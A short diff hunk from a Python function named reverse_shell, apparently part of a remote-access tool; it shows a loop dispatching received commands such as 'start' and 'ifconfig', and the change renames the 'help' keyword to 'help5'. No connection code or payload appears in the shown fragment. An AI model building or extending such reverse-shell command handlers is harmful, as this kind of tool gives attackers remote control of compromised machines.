@@ -84,7 +84,7 @@ def reverse_shell():
         elif "start" == output_split[0].lower() and ("/" not in output or "/" in output):
             start_file(output_split, OS)
             continue
-        elif "help" == output_split[0].lower() or "help" in output.lower():
+        elif "help5" == output_split[0].lower() or "help5" in output.lower():
             continue
         elif "ifconfig" == output_split[0].lower() or "ifconfig" in output.lower():
             ifconfig(OS)
